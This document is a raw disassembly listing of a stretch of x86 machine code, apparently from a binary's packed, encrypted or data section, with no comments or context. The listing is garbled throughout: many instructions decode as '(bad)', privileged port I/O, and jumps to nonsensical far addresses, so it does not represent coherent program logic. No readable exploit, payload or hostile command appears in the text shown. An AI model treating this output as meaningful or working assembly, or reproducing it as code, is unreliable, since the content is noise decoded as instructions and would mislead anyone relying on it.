  4135be:	mov    bl,0xfb
  4135c0:	mov    ecx,0xf2fff3fc
  4135c5:	(bad)  
  4135c6:	mov    ebp,0xf0d6c6eb
  4135cb:	(bad)  
  4135cc:	mov    ebp,0xe7e7e9fb
  4135d1:	(bad)  [ebp-0xf483f14]
  4135d7:	repnz retf 
  4135d9:	mov    cl,0xe9
  4135db:	in     eax,0xfa
  4135dd:	idiv   BYTE PTR [edi-0x3242203c]
  4135e3:	into   
  4135e4:	add    ebx,edx
  4135e6:	out    0xd6,al
  4135e8:	add    esi,edi
  4135ea:	call   0xda3d13c7
  4135ef:	faddp  st(1),st
  4135f1:	repnz mov esi,0xb6d2e3b0
  4135f7:	loopne 0x4135f0
  4135f9:	lods   al,BYTE PTR ds:[esi]
  4135fa:	int    0xd7
  4135fc:	aam    0xed
  4135fe:	int    0xca
  413600:	mov    ebx,0xd6fdbbc9
  413605:	in     al,dx
  413606:	test   ah,0xc6
  413609:	mov    DWORD PTR [edi],0xfeae4
  41360f:	(bad)  
  413610:	fsubr  st(5),st
  413612:	retf   
  413613:	shr    BYTE PTR [esi-0xf1c0d35],cl
  413619:	mov    cl,0xba
  41361b:	mov    al,0xb8
  41361d:	cmc    
  41361e:	sar    DWORD PTR [esi+0xfebaf7],cl
  413624:	pop    es
  413625:	cld    
  413626:	mov    esi,0xe500e2c3
  41362c:	cli    
  41362d:	into   
  41362e:	fld    DWORD PTR [ebx]
  413630:	(bad)  
  413632:	in     al,dx
  413633:	shr    BYTE PTR [eax-0x4a3d0c1a],0xb6
  41363a:	mov    al,0xf0
  41363c:	jmp    0x413629
  41363e:	icebp  
  41363f:	icebp  
  413640:	jmp    0xc83df623
  413645:	fsubrp st(4),st
  413647:	in     eax,0xf6
  413649:	add    edi,ecx
  41364b:	or     edi,ecx
  41364d:	stc    
  41364e:	(bad)  
  41364f:	(bad)  
  413650:	in     al,0x1
  413652:	mov    ebp,0xf0cecdcc
  413657:	repz into 
  413659:	call   0xb7363215
  41365e:	aam    0xb8
  413660:	cli    
  413661:	fadd   st,st(2)
  413663:	mov    dh,0xfb
  413665:	mov    edi,0xc7d1d602
  41366a:	retf   0xe8c7
  41366d:	(bad)  
  41366e:	in     al,dx
  41366f:	push   es
  413670:	in     eax,0xc4
  413672:	out    0xed,eax
  413674:	in     al,0xcd
  413676:	out    0xcb,al
  413678:	cmc    
  413679:	sti    
  41367a:	cmc    
  41367b:	in     al,0xf8
  41367d:	(bad)  
  41367f:	in     al,0xd1
  413681:	fld    DWORD PTR [ecx]
  413683:	pop    es
  413684:	mov    ecx,0xe7fefcde
  413689:	ror    DWORD PTR [eax],1
  41368b:	jecxz  0x41366f
  41368d:	fcmove st,st(6)
  41368f:	sti    
  413690:	push   es
  413691:	stc    
  413692:	shr    DWORD PTR [edi-0x322b341c],cl
  413698:	shl    dh,1
  41369a:	(bad)  
  41369c:	cmc    
  41369d:	retf   
  41369e:	(bad)  
  41369f:	int    0xf3
  4136a1:	mov    ah,0xe9
  4136a3:	aad    0x2
  4136a5:	add    dh,bh
  4136a7:	cmc    
  4136a8:	loope  0x41366e
  4136aa:	rol    al,1
  4136ac:	(bad)  
  4136ad:	(bad)  
  4136ae:	fdivr  st,st(1)
  4136b0:	int3   
  4136b1:	(bad)  
  4136b3:	mov    dl,0xe0
  4136b5:	int    0xd7
  4136b7:	int3   
  4136b8:	out    0xc4,eax
  4136ba:	enter  0xc5f1,0xd5
  4136be:	push   edx
  4136c0:	std    
  4136c1:	aad    0xbb
  4136c3:	mov    esi,0xfadcc3e3
  4136c8:	shl    bh,1
  4136ca:	cmc    
  4136cb:	(bad)  
  4136cc:	neg    dh
  4136ce:	jmp    0x4136df
  4136d0:	ror    DWORD PTR [esi],cl
  4136d2:	out    0xe0,eax
  4136d4:	jmp    0xd7e7:0xa9caecdd
  4136db:	mov    ecx,0xbbd9b4f3
  4136e0:	(bad)  
  4136e2:	in     al,dx
  4136e3:	int3   
  4136e4:	neg    bl
  4136e6:	icebp  
  4136e7:	add    eax,edx
  4136e9:	fucomi st,st(1)
  4136eb:	div    edi
  4136ed:	aad    0xe7
  4136ef:	(bad)  
  4136f1:	std    
  4136f2:	repz shl eax,1
  4136f5:	repz ret 
  4136f7:	ret    
  4136f8:	leave  
  4136f9:	call   0xeb08e5f3
  4136fe:	mov    eax,0xe3bbdcd7
  413703:	not    edx
  413705:	sar    ah,1
  413707:	std    
  413708:	lock mul ch
  41370b:	mov    esi,0xe80adcbd
  413710:	or     bh,bh
  413712:	fldcw  WORD PTR [ebp-0x482f0f3b]
  413718:	cmc    
  413719:	(bad)  
  41371a:	cli    
  41371b:	cmc    
  41371c:	aam    0xed
  41371e:	jmp    0x4136e4
  413720:	into   
  413721:	(bad)  
  413723:	sar    BYTE PTR [esi-0x1d2127],0x7
  41372a:	neg    ch
  41372c:	jmp    0x413736
  41372e:	add    ebp,eax
  413730:	or     al,al
  413732:	scas   eax,DWORD PTR es:[edi]
  413733:	xlat   BYTE PTR ds:[ebx]
  413734:	test   al,0xf7
  413736:	shl    edi,1
  413738:	enter  0xf7d7,0xe5
  41373c:	repz jmp 0xbb1b0935
  413742:	enter  0xf3bd,0x6
  413746:	sti    
  413747:	cli    
  413748:	in     al,0xdd
  41374a:	jmp    0xc82d3319
  41374f:	into   
  413750:	fcomip st,st(2)
  413752:	enter  0xd3c4,0xc2
  413756:	ret    
  413757:	out    0xd7,al
  413759:	(bad)  
  41375a:	rcr    bl,cl
  41375c:	sti    
  41375d:	cmc    
  41375e:	cld    
  41375f:	mov    ch,0xbc
  413761:	mov    ah,0xb8
  413763:	mov    edx,0xc2fcdee1
  413768:	fcmovnu st,st(5)
  41376a:	loopne 0x41376b
  41376c:	or     dl,ah
  41376e:	or     al,ah
  413770:	loopne 0x41375c
  413772:	ret    0xf0c9
  413775:	int    0xc8
  413777:	mov    dl,0xb5
  413779:	(bad)  
  41377a:	hlt    
  41377b:	stc    
  41377c:	out    0xc4,al
  41377e:	enter  0xf6cd,0xbf
  413782:	mov    esp,0xf8d8c7c1
  413787:	fcomp  st(3)
  413789:	(bad)  
  41378b:	inc    ecx
  41378d:	jecxz  0x413767
  41378f:	(bad)  
  413791:	fdiv   QWORD PTR [ecx-0x83f3f38]
  413797:	stos   BYTE PTR es:[edi],al
  413798:	mov    dl,0xf3
  41379a:	fxch   st(6)
  41379c:	mov    ch,0xd9
  41379e:	call   esp
  4137a0:	jmp    0xf71f0159
  4137a5:	(bad)  
  4137a6:	out    0xda,al
  4137a8:	jmp    0xc9c8:0x8fbf505
  4137af:	ficom  DWORD PTR [edx]
  4137b1:	rol    esp,cl
  4137b3:	call   0xe70cf683
  4137b8:	mov    ah,0xef
  4137ba:	out    dx,al
  4137bb:	iret   
  4137bc:	enter  0xf7f2,0xb4
  4137c0:	repz cld 
  4137c2:	cld    
  4137c3:	imul   esp
  4137c5:	rcl    ebp,cl
  4137c7:	repnz (bad) 
  4137c9:	cli    
  4137ca:	icebp  
  4137cb:	out    0xe9,al
  4137cd:	cmc    
  4137ce:	into   
  4137cf:	out    0xc,eax
  4137d1:	jmp    0x4137c4
  4137d3:	call   0xb303e9a3
  4137d8:	out    0xda,eax
  4137da:	out    0xb0,eax
  4137dc:	ror    ecx,1
  4137de:	jmp    0x4137be
  4137e0:	aad    0xb4
  4137e2:	sti    
  4137e3:	shl    ch,0xc2
  4137e6:	inc    ebx
  4137e8:	fcomp  st(5)
  4137ea:	sti    
  4137eb:	jecxz  0x4137ca
  4137ed:	or     esi,ebx
  4137ef:	std    
  4137f0:	jecxz  0x413805
  4137f2:	in     al,0xf1
  4137f4:	retf   0xf6de
  4137f7:	shl    al,0xd6
  4137fa:	mov    ecx,0xb7bbecc5
  4137ff:	mov    ah,0xf8
  413801:	clc    
  413802:	mov    esi,0xc1cce1dc
  413807:	mov    edx,0x7f0d4db
  41380c:	or     esp,edx
  41380e:	fmul   st(4),st
  413810:	cld    
  413811:	or     al,0xf1
  413813:	shr    DWORD PTR [ebp-0x19491e2e],1
  413819:	mov    bh,0xd4
  41381b:	mov    cl,0xbb
  41381d:	cmc    
  41381e:	(bad)  
  413820:	mov    ch,0xfe
  413822:	clc    
  413823:	pop    es
  413824:	loop   0x4137f9
  413826:	call   esi
  413828:	in     eax,0xd5
  41382a:	add    ebx,esp
  41382c:	mov    ebp,0xeec2f90a
  413831:	jmp    0x4137fe
  413833:	fcomip st,st(6)
  413835:	mov    bl,0xbc
  413837:	jmp    0xf52e050f
  41383c:	(bad)  
  41383d:	mov    ah,0xef
  41383f:	mov    esi,0xbde2bc03
  413844:	aam    0xe6
  413846:	repz loop 0x413842
  413849:	or     al,BYTE PTR [edi]
  41384b:	sti    
  41384c:	test   DWORD PTR [esi],0xfce8eb09
  413852:	mov    dl,0xf7
  413854:	retf   0xd2d1
  413857:	lods   al,BYTE PTR ds:[esi]
  413858:	(bad)  
  413859:	loop   0x413849
  41385b:	fcom   st(1)
  41385d:	mov    esi,0x1fabcb3
  413862:	fcom   st(6)
  413864:	cli    
  413865:	mov    esi,0xd5f0ecc2
  41386a:	ret    0xeac9
  41386d:	cli    
  41386e:	cld    
  41386f:	in     eax,dx
  413870:	(bad)  
  413872:	ror    ecx,1
  413874:	jmp    0xdbd9:0xc3eef0e9
  41387b:	in     eax,0xf0
  41387d:	ror    esp,cl
  41387f:	jmp    0x41384b
  413881:	enter  0xbad6,0xdd
  413885:	rol    BYTE PTR [ecx],0xf8
  413888:	sti    
  413889:	pop    es
  41388a:	(bad)  
  41388b:	loop   0x413868
  41388d:	or     dl,bl
  41388f:	ret    0xad9
  413892:	rol    esi,cl
  413894:	shr    BYTE PTR [edi-0x1e3f3151],cl
  41389a:	int    0xf0
  41389c:	aad    0xf8
  41389e:	(bad)  
  41389f:	sar    ah,cl
  4138a1:	aam    0xbd
  4138a3:	idiv   bl
  4138a5:	mov    ch,0xf6
  4138a8:	icebp  
  4138a9:	repnz retf 0xeed7
  4138ad:	push   ebp
  4138af:	jecxz  0x413892
  4138b1:	adc    al,bh
  4138b3:	retf   
  4138b4:	mov    esi,0xdbc3cde6
  4138b9:	test   dh,0xef
  4138bc:	jmp    0xbcde:0xb8d8b4b9
  4138c3:	fucomp st(6)
  4138c5:	cmc    
  4138c6:	push   es
  4138c7:	fcmovnu st,st(6)
  4138c9:	push   es
  4138ca:	div    eax
  4138cc:	shr    eax,0x6
  4138cf:	or     eax,ecx
  4138d1:	add    eax,edi
  4138d3:	in     al,0xce
  4138d5:	icebp  
  4138d6:	repnz aad 0xf0
  4138d9:	fndisi(8087 only) 
  4138db:	shl    bh,1
  4138dd:	out    dx,al
  4138de:	jmp    0xccfc:0xfbccefc8
  4138e5:	add    edi,edx
  4138e7:	add    eax,0xe5daffd3
  4138ec:	enter  0xe0fe,0xe7
  4138f0:	or     al,0x1
  4138f2:	rol    dl,0xea
  4138f5:	jecxz  0x4138ba
  4138f7:	hlt    
  4138f8:	mov    cl,0xc6
  4138fa:	mov    bl,0xe8
  4138fc:	(bad)  
  4138fe:	mov    ch,0xd3
  413900:	mov    edx,0xc2deb7f0
  413905:	fadd   DWORD PTR [esi]
  413907:	repz out 0xd1,al
  41390a:	fsub   st,st(1)
  41390c:	rol    BYTE PTR [ecx],0xfc
  41390f:	loop   0x413912
  413911:	clc    
  413912:	mov    bl,0xef
  413914:	in     al,0xeb
  413916:	loope  0x4138e7
  413918:	xlat   BYTE PTR ds:[ebx]
  413919:	(bad)  
  41391a:	into   
  41391b:	(bad)  
  41391c:	out    dx,eax
  41391d:	jmp    0xc2ff3818
  413922:	fiadd  WORD PTR [edx]
  413924:	ror    ah,0xf8
  413927:	add    DWORD PTR [eax],eax
  413929:	fndisi(8087 only) 
  41392b:	fst    st(6)
  41392d:	in     al,0xf8
  41392f:	enter  0xdce1,0xca
  413933:	icebp  
  413934:	mov    al,0xd3
  413936:	out    0xeb,al
  413938:	enter  0xfbef,0xf6
  41393c:	aad    0xdd
  41393e:	mov    esi,0xffefcbec
  413943:	out    dx,eax
  413944:	repz mov edi,0xeadbe4f0
  41394a:	or     cl,al
  41394c:	sti    
  41394d:	or     bl,bh
  41394f:	out    0xfe,al
  413951:	rcr    bh,cl
  413953:	repnz idiv DWORD PTR [esi-0x30182b3e]
  41395a:	out    dx,al
  41395b:	leave  
  41395c:	enter  0xfdb7,0xe4
  413960:	leave  
  413961:	leave  
  413962:	fdivrp st(4),st
  413964:	out    dx,al
  413965:	(bad)  
  413967:	push   es
  413968:	push   es
  413969:	shl    bl,0xe8
  41396c:	aam    0xc6
  41396e:	out    dx,al
  41396f:	(bad)  
  413970:	in     al,0xdc
  413972:	fdiv   st,st(0)
  413974:	imul   DWORD PTR [ebp-0x162c2a33]
  41397a:	mov    ebx,0xcebfeeb7
  41397f:	int    0xf0
  413981:	lock (bad) 
  413983:	shr    ch,1
  413985:	shl    edx,cl
  413987:	pop    es
  413988:	cmc    
  413989:	(bad)  
  41398a:	fxch   st(1)
  41398c:	in     eax,0x0
  41398e:	add    edx,ebp
  413990:	cld    
  413991:	in     al,0xf0
  413993:	stos   BYTE PTR es:[edi],al
  413994:	jecxz  0x413963
  413996:	shl    bl,1
  413998:	shl    BYTE PTR [ebx-0x4446174d],1
  41399e:	stc    
  41399f:	mov    edi,0xfebdbad8
  4139a4:	mov    esp,0xf8e4c2b8
  4139a9:	hlt    
  4139aa:	in     eax,0xf8
  4139ac:	sti    
  4139ad:	retf   0xf905
  4139b0:	(bad)  
  4139b1:	adc    DWORD PTR [edx-0xe3b0c0d],esi
  4139b7:	in     eax,0xc2
  4139b9:	leave  
  4139ba:	ror    eax,cl
  4139bc:	fcmovnu st,st(0)
  4139be:	clc    
  4139bf:	mov    edi,0xf9d903f1
  4139c4:	into   
  4139c5:	loope  0x4139ca
  4139c7:	jecxz  0x4139b3
  4139c9:	jmp    0x70b:0xbfdd001
  4139d0:	add    eax,DWORD PTR ds:0xe7dfa6d3
  4139d6:	cmc    
  4139d7:	test   edx,0xe7b0f6d0
  4139dd:	mov    ebx,0xd9f9b5dc
  4139e2:	(bad)  
  4139e4:	into   
  4139e5:	jecxz  0x4139cd
  4139e7:	push   es
  4139e8:	clc    
  4139e9:	xlat   BYTE PTR ds:[ebx]
  4139ea:	sti    
  4139eb:	stc    
  4139ec:	retf   0xe9fb
  4139ef:	push   es
  4139f0:	or     ebx,esi
  4139f2:	into   
  4139f3:	stos   BYTE PTR es:[edi],al
  4139f4:	call   0xed38fbb7
  4139f9:	retf   
  4139fa:	in     eax,0xdf
  4139fc:	enter  0xe4c9,0xcf
  413a00:	(bad)  
  413a01:	mov    ebx,0xc7fad6bb
  413a06:	add    al,0xcc
  413a08:	ret    
  413a09:	lock in al,0xd5
  413a0c:	aad    0xfd
  413a0e:	in     eax,dx
  413a0f:	add    eax,0xc9a9ede7
  413a14:	mov    bl,0xd0
  413a16:	cmc    
  413a17:	retf   0xb6c2
  413a1a:	in     al,dx
  413a1b:	in     eax,dx
  413a1c:	stc    
  413a1d:	mov    edi,0xd9cebbfa
  413a22:	mov    edi,0xf5dff0b8
  413a27:	inc    DWORD PTR [esi]
  413a29:	sti    
  413a2a:	fsubr  st,st(1)
  413a2c:	add    edi,ebp
  413a2e:	add    al,0xde
  413a30:	leave  
  413a31:	leave  
  413a32:	jmp    0x413a00
  413a34:	mov    esi,0xb5cccac4
  413a39:	mov    dh,0xfb
  413a3b:	out    dx,al
  413a3c:	mov    bh,0xf0
  413a3e:	ror    ah,1
  413a40:	mov    cl,0xba
  413a42:	clc    
  413a43:	(bad)  
  413a45:	mov    ebp,0x5d0bcd3
  413a4a:	loopne 0x413a17
  413a4c:	out    dx,al
  413a4d:	std    
  413a4e:	(bad)  
  413a50:	in     al,0xe2
  413a52:	mov    esp,0xd6d7afd2
  413a57:	loop   0x413a25
  413a59:	mov    bh,0xe1
  413a5b:	out    dx,al
  413a5c:	(bad)  
  413a5d:	lock lock les esi,FWORD PTR [ecx-0xb10fc50]
  413a65:	rol    BYTE PTR [ecx],1
  413a67:	push   es
  413a68:	(bad)  
  413a69:	or     esp,edi
  413a6b:	(bad)  
  413a6c:	cld    
  413a6d:	out    0xde,al
  413a6f:	into   
  413a70:	push   cs
  413a71:	icebp  
  413a72:	mov    eax,0xe0cde5e6
  413a77:	loopne 0x413a69
  413a79:	mov    edx,0xb7cad1c9
  413a7e:	mov    ebp,0x2d6ebbf
  413a83:	mov    ecx,0xe1dadbde
  413a88:	(bad)  
  413a89:	jecxz  0x413a61
  413a8b:	stc    
  413a8c:	retf   0xfb03
  413a8f:	(bad)  
  413a91:	icebp  
  413a92:	(bad)  
  413a93:	leave  
  413a94:	lods   eax,DWORD PTR ds:[esi]
  413a95:	in     al,dx
  413a96:	(bad)  
  413a97:	div    DWORD PTR [edx-0x4e49282d]
  413a9d:	mov    ecx,0xc3f003ed
  413aa2:	mov    edi,0xe6d8bce0
  413aa7:	sar    ebx,0xe0
  413aaa:	retf   0xfe0a
  413aad:	out    0xe8,al
  413aaf:	or     DWORD PTR [ecx+esi*8],ecx
  413ab2:	icebp  
  413ab3:	out    0xdd,eax
  413ab5:	scas   al,BYTE PTR es:[edi]
  413ab6:	in     eax,dx
  413ab7:	loop   0x413ab4
  413ab9:	(bad)  
  413aba:	iret   
  413abb:	repnz (bad) 
  413abe:	sar    DWORD PTR [ebx-0x280a1214],1
  413ac4:	aad    0xcc
  413ac6:	repz clc 
  413ac8:	xlat   BYTE PTR ds:[ebx]
  413ac9:	pop    es
  413aca:	rol    edi,0xde
  413acd:	retf   
  413ace:	out    0xeb,al
  413ad0:	inc    DWORD PTR [esi]
  413ad2:	(bad)  
  413ad3:	shr    ebx,1
  413ad5:	out    0xdc,eax
  413ad7:	mov    bh,0xc8
  413ad9:	lods   al,BYTE PTR ds:[esi]
  413ada:	mov    edx,0xedffb4e4
  413adf:	enter  0xcceb,0xb8
  413ae3:	(bad)  
  413ae4:	out    0xd9,eax
  413ae6:	fdivrp st(6),st
  413ae8:	in     al,0x6
  413aea:	ret    
  413aeb:	std    
  413aec:	push   es
  413aed:	(bad)  
  413aee:	retf   0xcc9
  413af1:	or     BYTE PTR [eax-0x135b1c1d],bh
  413af7:	leave  
  413af8:	sti    
  413af9:	aam    0xec
  413afb:	mov    cl,0xc7
  413afd:	(bad)  
  413aff:	aad    0xd3
  413b01:	mov    esi,0xdbc3e8b7
  413b06:	fcmovnu st,st(0)
  413b08:	aam    0xe0
  413b0a:	(bad)  
  413b0b:	enter  0xedc1,0xe2
  413b0f:	in     eax,0xee
  413b11:	ror    ch,cl
  413b13:	(bad)  
  413b15:	ror    eax,1
  413b17:	repz jecxz 0x413afc
  413b1a:	mov    ah,0xeb
  413b1c:	mov    cl,0xeb
  413b1e:	stc    
  413b1f:	mov    edi,0xd7d2f002
  413b24:	sar    eax,cl
  413b26:	xlat   BYTE PTR ds:[ebx]
  413b27:	in     al,0xc0
  413b29:	add    esp,ebx
  413b2b:	enter  0xdbd8,0xf
  413b2f:	std    
  413b30:	into   
  413b31:	jmp    0x413af9
  413b33:	mov    eax,0xb0e8e5c8
  413b38:	mov    bh,0xed
  413b3a:	repz sar BYTE PTR [ecx-0xf4d2e37],0xe1
  413b42:	call   0xcc421429
  413b47:	add    BYTE PTR ds:0xe9ff05cb,al
  413b4d:	jecxz  0x413b4e
  413b4f:	call   ebx
  413b51:	iret   
  413b52:	leave  
  413b53:	lods   al,BYTE PTR ds:[esi]
  413b54:	test   edi,0xe9b2bcef
  413b5a:	aad    0xb5
  413b5c:	iret   
  413b5d:	mov    ch,0xd5
  413b5f:	call   0xc41a1230
  413b64:	iret   
  413b65:	aad    0xd1
  413b67:	xlat   BYTE PTR ds:[ebx]
  413b68:	fsin   
  413b6a:	aad    0xc4
  413b6c:	pop    es
  413b6d:	(bad)  
  413b6e:	stc    
  413b6f:	loope  0x413b69
  413b71:	in     eax,dx
  413b72:	loope  0x413b5a
  413b74:	mov    ebp,0xf7b0c8c6
  413b79:	out    dx,al
  413b7a:	fcomi  st,st(1)
  413b7c:	aad    0xf9
  413b7e:	mov    edx,0xedb4dcb9
  413b83:	mov    edi,0xf301ccdb
  413b88:	shr    bl,1
  413b8a:	ret    0xebda
  413b8d:	fisttp WORD PTR [edi+eiz*8]
  413b90:	iret   
  413b91:	add    eax,0xcde9e4b8
  413b96:	jmp    0x413b8a
  413b98:	iret   
  413b99:	mov    dh,0xe8
  413b9b:	push   ebp
  413b9d:	fyl2xp1 
  413b9f:	(bad)  
  413ba0:	retf   
  413ba1:	cli    
  413ba2:	fdivrp st(5),st
  413ba4:	std    
  413ba5:	icebp  
  413ba6:	jmp    ebp
  413ba8:	fld    QWORD PTR [eax]
  413baa:	mov    edi,0xd9d903cb
  413baf:	fucomip st,st(6)
  413bb1:	in     al,0xbd
  413bb3:	out    dx,al
  413bb4:	(bad)  
  413bb5:	mov    esp,0xf3d6cce1
  413bba:	jmp    0xc9f81b7f
  413bbf:	(bad)  
  413bc1:	leave  
  413bc2:	mov    edi,0xd7b8c0c8
  413bc7:	repz sti 
  413bc9:	shl    al,0x1
  413bcc:	cli    
  413bcd:	retf   
  413bce:	dec    bh
  413bd0:	sti    
  413bd1:	add    esp,ebx
  413bd3:	jmp    0x413b9e
  413bd5:	fsubr  st(1),st
  413bd7:	ret    
  413bd8:	in     eax,dx
  413bd9:	(bad)
  413bdc:	enter  0xfaed,0xfb
  413be0:	(bad)  
  413be2:	mov    esi,0xe4e2d5e8
  413be7:	not    edi
  413be9:	or     eax,edi
  413beb:	cli    
  413bec:	loopne 0x413be2
  413bee:	sti    
  413bef:	or     ah,ah
  413bf1:	sar    BYTE PTR [esi+eax*8-0x230c3c4e],0xec
  413bf9:	shl    ecx,0xc7
  413bfc:	rcr    edi,1
  413bfe:	in     eax,dx
  413bff:	cli    
  413c00:	idiv   ebp
  413c02:	aam    0xc8
  413c04:	int    0xd2
  413c06:	out    0xdf,eax
  413c08:	loopne 0x413bdc
  413c0a:	loop   0x413bca
  413c0c:	neg    ebx
  413c0e:	mov    BYTE PTR [edi],0xc8
  413c11:	clc    
  413c12:	fsubr  st,st(0)
  413c14:	call   0xe61333da
  413c19:	hlt    
  413c1a:	(bad)
  413c1d:	(bad)  
  413c1f:	(bad)  
  413c21:	clc    
  413c22:	out    dx,al
  413c23:	rcr    ah,1
  413c25:	rcl    esi,1
  413c27:	repz ror BYTE PTR [ecx],1
  413c2a:	in     eax,0x8
  413c2c:	(bad)  
  413c2d:	lds    ecx,FWORD PTR [edx]
  413c2f:	(bad)  
  413c30:	in     al,dx
  413c31:	pminsw mm2,mm3
  413c34:	mov    esp,0xf7ceaec6
  413c39:	mov    dl,0xe6
  413c3b:	(bad)  
  413c3d:	std    
  413c3e:	fdiv   QWORD PTR [esp+ecx*8-0x4043420a]
  413c45:	repz sti 
  413c47:	rol    dl,cl
  413c49:	jmp    0xfc49412c
  413c4e:	add    eax,esp
  413c50:	fcmovnb st,st(4)
  413c52:	mov    esp,0xd6e2e1e3
  413c57:	int    0xf4
  413c59:	sar    BYTE PTR [ebx-0x2c330810],1
  413c5f:	jmp    0x413c43
  413c61:	jmp    0xfee5:0xd307d7d0
  413c68:	add    al,0x3
  413c6a:	rcr    bh,0xd4
  413c6d:	(bad)  
  413c6e:	fsubrp st(7),st
  413c70:	loopne 0x413c83
  413c72:	in     al,0xec
  413c74:	enter  0xf5c6,0xc2
  413c78:	fcmovnbe st,st(2)
  413c7a:	repnz hlt 
  413c7c:	fidiv  DWORD PTR [ebp-0x2a132743]
  413c82:	mov    ecx,0xc6fddc07
  413c87:	sti    
  413c88:	add    bl,dh
  413c8a:	(bad)  
  413c8b:	fucom  st(3)
  413c8d:	std    
  413c8e:	or     eax,edx
  413c90:	add    dl,BYTE PTR [edx]
  413c92:	out    0xe2,eax
  413c94:	xlat   BYTE PTR ds:[ebx]
  413c95:	in     al,dx
  413c96:	ror    ebp,cl
  413c98:	loope  0x413c42
  413c9a:	loope  0x413c9b
  413c9c:	mov    edi,0xcdcef7d9
  413ca1:	not    esi
  413ca3:	loop   0x413c9d
  413ca5:	mov    edi,0x9faccf2
  413caa:	retf   
  413cab:	clc    
  413cac:	fcomi  st,st(4)
  413cae:	(bad)  [ebx]
  413cb0:	out    dx,eax
  413cb1:	pop    es
  413cb2:	lods   eax,DWORD PTR ds:[esi]
  413cb3:	test   al,0xef
  413cb5:	fsubp  st(1),st
  413cb7:	shl    edx,1
  413cb9:	(bad)  
  413cba:	icebp  
  413cbb:	call   0xcafc10a8
  413cc0:	mov    eax,0xe1b6f7df
  413cc5:	shl    dh,cl
  413cc7:	sti    
  413cc8:	lock shl ebp,0xc9
  413ccc:	fld    QWORD PTR [edi]
  413cce:	ret    
  413ccf:	push   cs
  413cd0:	call   0xe73115d7
  413cd5:	jmp    0xb32838a1
  413cda:	into   
  413cdb:	loopne 0x413cac
  413cdd:	mov    edi,0xbfb1d8f4
  413ce2:	sar    BYTE PTR [edi-0xdfe0a3d],cl
  413ce8:	fld    QWORD PTR [eax]
  413cea:	xlat   BYTE PTR ds:[ebx]
  413ceb:	push   es
  413cec:	fchs   
  413cee:	loop   0x413cb9
  413cf0:	fisttp DWORD PTR [edx]
  413cf2:	shl    esi,1
  413cf4:	vcmppd xmm4,xmm2,xmm3,0xc8
  413cf9:	out    dx,al
  413cfa:	ror    edi,0xd7
  413cfd:	mov    ebx,0xeef6dee5
  413d02:	mov    bh,0xfc
  413d04:	hlt    
  413d05:	add    ecx,edx
  413d07:	test   BYTE PTR [ecx],0xd8
  413d0a:	(bad)  
  413d0b:	rcr    ah,1
  413d0d:	add    ecx,eax
  413d0f:	fsubp  st(7),st
  413d11:	jmp    0xb2c2:0xe2cbe9ae
  413d18:	ret    
  413d19:	in     eax,dx
  413d1a:	shl    esi,cl
  413d1c:	mov    eax,0xd6cbf6f6
  413d21:	add    DWORD PTR [eax-0x3f3f0223],edi
  413d27:	(bad)  
  413d28:	mov    ecx,0xe2efc7b8
  413d2d:	fcos   
  413d2f:	clc    
  413d30:	or     cl,BYTE PTR [edx]
  413d32:	scas   eax,DWORD PTR es:[edi]
  413d33:	mov    bl,0xd0
  413d35:	into   
  413d36:	(bad)  
  413d37:	(bad)
  413d3b:	(bad)  
  413d3c:	out    0xbb,eax
  413d3e:	sar    DWORD PTR [esi-0x46234423],cl
  413d44:	imul   esi
  413d46:	mov    edi,0x402bcf6
  413d4b:	fxam   
  413d4d:	out    dx,al
  413d4e:	(bad)  
  413d4f:	in     al,dx
  413d50:	fcom   DWORD PTR [ecx]
  413d52:	mov    ebp,0xd0dce3e0
  413d57:	aad    0xf6
  413d59:	icebp  
  413d5a:	in     al,0xff
  413d5c:	jmp    0x413d4d
  413d5e:	mov    bh,0xbc
  413d60:	mov    ah,0xc9
  413d62:	(bad)  
  413d63:	mov    ecx,0xbdef0d5
  413d68:	fild   WORD PTR ds:0xd6c00fd4
  413d6e:	or     eax,0xddfec9cb
  413d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d74:	(bad)  
  413d75:	mov    bl,0xcf
  413d77:	loope  0x413d5c
  413d79:	mov    ch,0xe1
  413d7b:	div    BYTE PTR [edi-0xb002428]
  413d81:	xlat   BYTE PTR ds:[ebx]
  413d82:	int3   
  413d83:	add    ch,ah
  413d85:	pop    es
  413d86:	in     eax,0xe2
  413d88:	fild   DWORD PTR [ebx]
  413d8a:	retf   0xf9e8
  413d8d:	in     eax,dx
  413d8e:	fucomp st(1)
  413d90:	add    al,bl
  413d92:	loopne 0x413d66
  413d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d95:	in     eax,dx
  413d96:	iret   
  413d97:	shl    DWORD PTR [ecx-0x1514322a],0xc4
  413d9e:	sti    
  413d9f:	into   
  413da0:	idiv   ah
  413da2:	mov    eax,0xd0d006e8
  413da7:	rcl    eax,cl
  413da9:	inc    BYTE PTR [esi]
  413dab:	out    0xf9,eax
  413dad:	out    dx,al
  413dae:	add    eax,0xe4caca09
  413db3:	shl    ebp,1
  413db5:	in     eax,0xd7
  413db7:	stos   BYTE PTR es:[edi],al
  413db8:	fidiv  DWORD PTR [ebx-0x2a0d45]
  413dbe:	iret   
  413dbf:	mov    ebp,0xd8ed01d0
  413dc4:	(bad)  
  413dc5:	repnz mov edi,0xfce0e6db
  413dcb:	ret    0xfdeb
  413dce:	cli    
  413dcf:	(bad)  
  413dd0:	sti    
  413dd1:	repnz lods al,BYTE PTR ds:[esi]
  413dd3:	call   0xc608f4a2
  413dd8:	jmp    0x413d8e
  413dda:	shl    cl,1
  413ddc:	(bad)  
  413ddd:	lods   al,BYTE PTR ds:[esi]
  413dde:	shr    dl,1
  413de0:	cmc    
  413de1:	loop   0x413d9f
  413de3:	add    edi,DWORD PTR [edi+eax*1+0x7f0f8]
  413dea:	sti    
  413deb:	loope  0x413dd6
  413ded:	aam    0xfa
  413def:	(bad)
  413df2:	jmp    0xb7fe34a7
  413df7:	mov    bl,0xb3
  413df9:	retf   0xe7f1
  413dfc:	out    dx,al
  413dfd:	out    dx,al
  413dfe:	mov    esi,0xecf5d3d6
  413e03:	mov    eax,0xf905c2fd
  413e08:	add    bh,dh
  413e0a:	retf   0xebde
  413e0d:	fld    st(3)
  413e0f:	add    eax,0xbfacd9c9
  413e14:	mov    bh,0xa8
  413e16:	xlat   BYTE PTR ds:[ebx]
  413e17:	enter  0xd5f4,0xc7
  413e1b:	leave  
  413e1c:	lds    edi,FWORD PTR [ebx-0xa273435]
  413e22:	stc    
  413e23:	mov    esp,0xf704d2e3
  413e28:	sar    ebx,cl
  413e2a:	or     ecx,edi
  413e2c:	or     ecx,edi
  413e2e:	into   
  413e2f:	(bad)  
  413e30:	into   
